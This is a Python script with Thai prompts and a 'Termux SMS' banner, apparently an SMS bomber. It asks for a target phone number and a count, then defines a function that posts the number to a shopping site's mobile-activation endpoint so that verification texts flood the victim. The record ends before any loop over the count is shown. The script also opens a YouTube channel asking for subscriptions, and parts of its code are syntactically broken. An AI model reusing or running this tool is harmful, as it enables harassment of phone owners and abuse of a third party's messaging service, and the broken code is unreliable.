import requests
import os
import time
import threading
from threading import Thread
os.system("clear")
time.sleep (1)
print ("\t\x1b[91mกำลังโหลด")
time.sleep (5)
os.system ("clear")
time.sleep (1)
print ("\x1b[91mไปกดติดตาม!!!")
time.sleep (1)
print ("\x1b[96m[\x1b[91m1\x1b[96m] \x1b[96mฝากกดติดตามด้วยนะคับ \x1b[91m:V")
time.sleep (1)
os.system("xdg-open https://youtube.UCbr-yryUDzkiFvF8VnSTyAw")
time.sleep (8)
print ("\x1b[96m[\x1b[91m2\x1b[96m] \x1b[96mกดติดตามผมด้วยครับ\x1b[91m:)")
time.sleep (1)
print ("\x1b[91m")
os.system ("clear")
time.sleep (1)
print("\033[92mํ echo -e "\e[32m   ______                                  _____ __  ________ "
  /_  __/__  _________ ___  __  ___  __   / ___//  |/  / ___/ " 
/ / / _ \/ ___/ __ '__ \/ / / / |/_/   \__ \/ /|_/ /\__ \ "
/ / /  __/ /  / / / / / / /_/ />  <    ___/ / /  / /___/ / "
/_/  \___/_/  /_/ /_/ /_/\__,_/_/|_|   /____/_/  /_//____/  \e[0m"
print("")
print("\033[92mhttps://wwwprofile.php?id=100023848152009")
print("")
print("")
print("\033[92mYouTube:บีมTV")
print("list")
print("")
phone = input("\033[95m[+] เบอร์ : \033[0m")
num = int(input("\033[95m[+] จำนวน : \033[0m"))
os.system("clear")

def test(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print("\033[92m ยิงอยู่ครับ")
